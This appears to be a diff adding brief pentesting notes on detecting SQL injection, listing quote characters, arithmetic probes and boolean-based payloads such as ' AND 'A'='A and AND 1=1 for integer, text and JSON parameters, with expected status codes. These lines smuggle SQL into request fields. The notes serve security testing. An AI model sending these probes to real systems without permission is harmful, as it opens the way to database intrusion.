@@ -1,0 +1,34 @@
+user_id=1338-1 --- see if you getting any result like 1337 etc 
+
+    Single quote (')
+    Double quote (")
+    Semicolon (;)
+
+
+Test for Multiple Symbols
+
+    login=admin (status: 200)
+    login=admin' (status: 500)
+    login=admin'' (status: 200)
+
+Integer Parameter:
+
+    user_id=1337 AND 1=1 (status: 200)
+    user_id=1337 AND 2=1 (status: 500)
+
+Text Parameter:
+
+    login=admin' AND 'A'='A (status: 200)
+    login=admin' AND 'A'='B (status: 500)
+
+
+JSON Integer Parameter:
+
+    {"user_id":"1337 AND 1=1"} (status: 200)
+
+Examples:
+
+    Integer Parameter: user_id=1337 AND 1=1 -- (status: 200)
+    Text Parameter: login=admin' AND 'A'='A' -- (status: 200)
+    JSON Integer Parameter: {"user_id":"1337 AND 1=1 --"} (status: 200)
+    JSON Text Parameter: {"login":"admin' AND 'A'='A' --"} (status: 200)
